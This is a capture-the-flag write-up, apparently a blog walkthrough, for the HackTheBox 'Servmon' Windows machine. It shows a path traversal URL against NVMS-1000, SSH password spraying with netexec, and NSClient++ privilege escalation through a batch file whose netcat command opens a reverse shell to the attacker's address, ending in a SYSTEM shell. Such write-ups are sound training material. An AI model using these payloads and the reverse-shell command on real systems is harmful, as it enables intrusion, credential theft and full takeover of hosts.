

This time, I will introduce an approach to solving "Servmon", an easy Windows machine in hackthebox that required two exploits.

The box starts with ftp enumeration, which reveals that there is a txt file on the desktop of one of the users with passwords in it. Enumerating http on port 80, we see that it is running NVMS-1000 Web server vulnerable to path traversal, which can be used to read the passwords file. One of the passwords works with SSH and we can get user flag.

To get System I exploit a vulnerability in NSClient++ running with https on port 8443, which allows to run commands in the context of system.
## Recon

I'll use first `nmap` to scan all TCP ports and find out which ones are open

```
┌──(10.10.14.154)─(kali@kali)-[~/boxes/servmon]
└─ [★]$ sudo nmap 10.129.30.98 -p- --min-rate=10000 -oA nmap/allports
[sudo] password for kali:
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-04 11:53 EDT
Warning: 10.129.30.98 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.30.98
Host is up (0.047s latency).
Not shown: 65426 closed tcp ports (reset), 92 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5666/tcp  open  nrpe
6063/tcp  open  x11
6699/tcp  open  napster
8443/tcp  open  https-alt
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.39 seconds
```

`nmap` shows 17 open ports including ftp, ssh, smb, and http/https. We will now perform a service and version detection scan on these ports.

```bash
┌──(10.10.14.154)─(kali@kali)-[~/boxes/servmon]
└─ [★]$ sudo nmap -p 21,22,80,135,139,445,5666,6063,6699,8443,49664,49665,49666,49667,49668,49669,49670 -sC -sV -oA nmap/detailed -vv 10.129.30.98
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-04 11:57 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:57
Completed NSE at 11:57, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:57
Completed NSE at 11:57, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:57
Completed NSE at 11:57, 0.00s elapsed
Initiating Ping Scan at 11:57
Scanning 10.129.30.98 [4 ports]
Completed Ping Scan at 11:57, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:57
Completed Parallel DNS resolution of 1 host. at 11:57, 0.01s elapsed
Initiating SYN Stealth Scan at 11:57
Scanning 10.129.30.98 [17 ports]
Discovered open port 445/tcp on 10.129.30.98
Discovered open port 21/tcp on 10.129.30.98
Discovered open port 22/tcp on 10.129.30.98
Discovered open port 139/tcp on 10.129.30.98
Discovered open port 80/tcp on 10.129.30.98
Discovered open port 49667/tcp on 10.129.30.98
Discovered open port 135/tcp on 10.129.30.98
Discovered open port 49668/tcp on 10.129.30.98
Discovered open port 6063/tcp on 10.129.30.98
Discovered open port 6699/tcp on 10.129.30.98
Discovered open port 49665/tcp on 10.129.30.98
Discovered open port 49664/tcp on 10.129.30.98
Discovered open port 49666/tcp on 10.129.30.98
Discovered open port 49670/tcp on 10.129.30.98
Discovered open port 49669/tcp on 10.129.30.98
Discovered open port 8443/tcp on 10.129.30.98
Discovered open port 5666/tcp on 10.129.30.98
Completed SYN Stealth Scan at 11:57, 0.11s elapsed (17 total ports)
Initiating Service scan at 11:57
Scanning 17 services on 10.129.30.98
Service scan Timing: About 52.94% done; ETC: 11:59 (0:00:48 remaining)
Stats: 0:01:23 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 88.24% done; ETC: 11:59 (0:00:11 remaining)
Completed Service scan at 11:59, 110.93s elapsed (17 services on 1 host)
NSE: Script scanning 10.129.30.98.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:59
NSE: [ftp-bounce 10.129.30.98:21] PORT response: 501 Server cannot accept argument.
Completed NSE at 11:59, 16.21s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:59
Completed NSE at 11:59, 1.27s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:59
Completed NSE at 11:59, 0.00s elapsed
Nmap scan report for 10.129.30.98
Host is up, received echo-reply ttl 127 (0.040s latency).
Scanned at 2026-05-04 11:57:29 EDT for 128s

PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM       <DIR>          Users
| ftp-syst:
|_  SYST: Windows_NT
22/tcp    open  ssh           syn-ack ttl 127 OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLqFnd0LtYC3vPEYbWRZEOTBIpA++rGtx7C/R2/f2Nrro7eR3prZW...
80/tcp    open  http          syn-ack ttl 127
|_http-title: Site doesn\'t have a title (text/html).
| fingerprint-strings:
|   GetRequest, HTTPOptions, RTSPRequest:
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo:
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL:
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 3AEF8B29C4866F96A539730FAB53A88F
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
5666/tcp  open  tcpwrapped    syn-ack ttl 127
6063/tcp  open  tcpwrapped    syn-ack ttl 127
6699/tcp  open  napster?      syn-ack ttl 127
8443/tcp  open  ssl/https-alt syn-ack ttl 127
|_ssl-date: TLS randomness does not represent time
| http-methods:
|_  Supported Methods: GET
| http-title: NSClient++
|_Requested resource was /index.html
| fingerprint-strings:
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions:
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest:
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     iday
|     :Saturday
|     workers
|     jobs
|_    \x12
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-01-14T13:24:20
| Not valid after:  2021-01-13T13:24:20
| MD5:   1d03:0c40:5b7a:0f6d:d8c8:78e3:cba7:38b4
| SHA-1: 7083:bd82:b4b0:f9c0:cc9c:5019:2f9f:9291:4694:8334
| -----BEGIN CERTIFICATE-----
| MIICoTCCAYmgAwIBAgIBADANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAlsb2Nh
...
|_-----END CERTIFICATE-----
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.95%I=7%D=5/4%Time=69F8C1ED%P=x86_64-pc-linux-gnu%r(NULL,
...
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 56648/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 7293/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 32349/udp): CLEAN (Timeout)
|   Check 4 (port 46538/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_clock-skew: 0s
| smb2-time:
|   date: 2026-05-04T15:59:22
|_  start_date: N/A

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:59
Completed NSE at 11:59, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:59
Completed NSE at 11:59, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:59
Completed NSE at 11:59, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 128.81 seconds
```


Scanning through the list, things to check out will be FTP (TCP 21) with anonymous login allowed, SMB (TCP 445), HTTP (TCP 80) and HTTPS (TCP 8443). WinRM (TCP 5985) and SSH (TCP 22) will come in handy if I get creds


## FTP - TCP 21

Since `nmap` identified that anonymous FTP login was enabled, we can login into the FTP server using "anonymous" for the username and password.

```
┌──(10.10.14.154)─(kali@kali)-[~/boxes/servmon]
└─ [★]$ ftp 10.129.30.98
Connected to 10.129.30.98.
220 Microsoft FTP Service
Name (10.129.30.98:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
```

I’ll grab all of the files there with `wget -r ftp://anonymous:@10.129.30.98`(this would be not a great idea on a real server where I’d be tons of stuff, but works well for a CTF). There were two files:

```
┌──(10.10.14.154)─(kali@kali)-[~/boxes/servmon]
└─ [★]$ find ftp/ -type f
ftp/Users/Nadine/Confidential.txt
ftp/Users/Nathan/Notes to do.txt
```

#### File-1: Confidential.txt
`Users/Nadine/Confidential.txt`
```
Nathan, I left your Passwords.txt file on your Desktop. Please remove this once you have edited it yourself and place it back into the secure folder. Regards Nadine
```
A user named "Nadine" apparently wrote a message to a user named "Nathan" about a certain file. The message can be used to pinpoint the complete location of this file.
#### File-2: Notes to do.txt
`Users/Nathan/Notes to do.txt`
```
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```
This file contains references for two applications, NVMS and NSClient, make a note of them for later as they could come in handy.


## SMB - TCP 445

Without credentials it appears we can't connect to SMB.

```
┌──(10.10.14.154)─(kali@kali)-[~/boxes/servmon]
└─ [★]$ smbclient -N -L //10.10.10.184/ session setup failed: NT_STATUS_ACCESS_DENIED
```


## HTTP - TCP 80

If I go to `http://10.10.10.184/`, i can see that NVMS-1000 is running and it redirects me to `/Pages/login.htm`


Trying to guess the user and password didn't work.

A google search reveals a directory traversal vulnerability related to NVMS 1000.
![](attachments/Pasted%20image%2020260505185910.png)
It basically says I can request `/../../../../../../../../../../../../windows/win.ini` and get it.

![](<attachments/{08E98797-AC05-4787-9689-54B1BD7709C3}.png>)

## Shell as nadine


We can check for the `Passwords.txt` file mentioned in the note

```
http://10.129.30.98/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers/Nathan/Desktop/passwords.txt
```

![](attachments/%7BA97B5C3B-6D85-48AF-8A75-0876205D9515%7D.png)

```
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

I can use netexec to see if any of these passwords work for any of the users for SSH

``` bash
┌──(10.10.14.154)─(kali@kali)-[~/boxes/servmon]
└─ [★]$ nxc ssh 10.129.30.117 -u users -p pass --continue-on-success
SSH         10.129.30.117   22     10.129.30.117    [*] SSH-2.0-OpenSSH_for_Windows_8.0
SSH         10.129.30.117   22     10.129.30.117    [-] nathan:1nsp3ctTh3Way2Mars!
SSH         10.129.30.117   22     10.129.30.117    [-] nadine:1nsp3ctTh3Way2Mars!
SSH         10.129.30.117   22     10.129.30.117    [-] nathan:Th3r34r3To0M4nyTrait0r5!
SSH         10.129.30.117   22     10.129.30.117    [-] nadine:Th3r34r3To0M4nyTrait0r5!
SSH         10.129.30.117   22     10.129.30.117    [-] nathan:B3WithM30r4ga1n5tMe
SSH         10.129.30.117   22     10.129.30.117    [-] nadine:B3WithM30r4ga1n5tMe
SSH         10.129.30.117   22     10.129.30.117    [-] nathan:L1k3B1gBut7s@W0rk
SSH         10.129.30.117   22     10.129.30.117    [+] nadine:L1k3B1gBut7s@W0rk  Windows - Shell access!
SSH         10.129.30.117   22     10.129.30.117    [-] nathan:0nly7h3y0unGWi11F0l10w
SSH         10.129.30.117   22     10.129.30.117    [-] nathan:IfH3s4b0Utg0t0H1sH0me
SSH         10.129.30.117   22     10.129.30.117    [-] nathan:Gr4etN3w5w17hMySk1Pa5$
```

We get correct credentials in the results: `Nadine`:`L1k3B1gBut7s@W0rk`

```
ssh nadine@10.129.30.117

Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>whoami
servmon\nadine
```


## Privilege Escalation

I previously learned  from the FTP file called "Notes to do.txt"  a service called `NSClient++` could be running on the box.


I check `https://10.129.30.117:8443` and get to NSClient ++ login page.

Looking for a vulnerability related to NSClient++ I get this privilege escalation vulnerability
https://www.exploit-db.com/exploits/46802

From reading it we can see the admin password is stored at `c:\program files\nsclient++\nsclient.ini`

```
nadine@SERVMON C:\temp>type "c:\program files\nsclient++\nsclient.ini"

# For details run: nscp settings --help                                            
; in flight - TODO                                                                 

[/settings/default]
 
; Undocumented key                                                                 
password = ew2x6SsGTxjRwXOT

; Undocumented key                  
allowed hosts = 127.0.0.1
```

If I try to login I get 403 You're not allowed error
![](attachments/%7BAD33A294-B4B9-45E4-B5B4-52F1774DB925%7D.png)

The nsclient.ini file reveals `allowed hosts` is set to `127.0.0.1`

Therefore, I set a local port forwarding using SSH

```
ssh -N -L 8443:127.0.0.1:8443 nadine@10.129.30.117
```

Then I can login into the Web at `https://localhost:8443`

Two files need to be placed on the victim machine.

```
nc.exe - Used for establishing a reverse shell as System
evil.bat - You can name this file whatever you like. Put the following shell code inside:

@echo off
c:\temp\nc.exe 10.10.14.154 443 -e cmd.exe

```

Let's create a directory called `C:\temp` on the victim's machine and transfer these two files there.


```
scp bad.bat nadine@10.129.30.117:/temp

scp nc.exe nadine@10.129.30.117:/temp
```


Next, I will create an "external script". Go to Settings -> external scripts -> scripts 
and press the "Add new" button.
![](attachments/Pasted%20image%2020260504204245.png)

Complete the fields as shown.

After hitting add go to "Changes" and click `Save configuration`
![](attachments/%7B4584246E-5AAB-4248-8A88-3268B5B043E8%7D.png)

Next click "Control" and click `Reload`
![](attachments/Pasted%20image%2020260504204530.png)


Then go to "Queries" and select the script 'pe'

![](attachments/%7BAF4A018B-927A-4CCE-B603-62B8713463B4%7D.png)



Start a listener on my kali machine:
```
nc -lnvp 443
```


And then run the script
![](attachments/%7B3D1BE34A-2340-40D7-B9A0-13D8882623D8%7D.png)

With the exploit successfully executed we get a reverse-shell as nt authority\system
```
┌──(10.10.14.154)─(kali@kali)-[~/boxes/servmon]
└─ [★]$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.154] from (UNKNOWN) [10.129.30.117] 50452
Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>whoami
whoami
nt authority\system
```
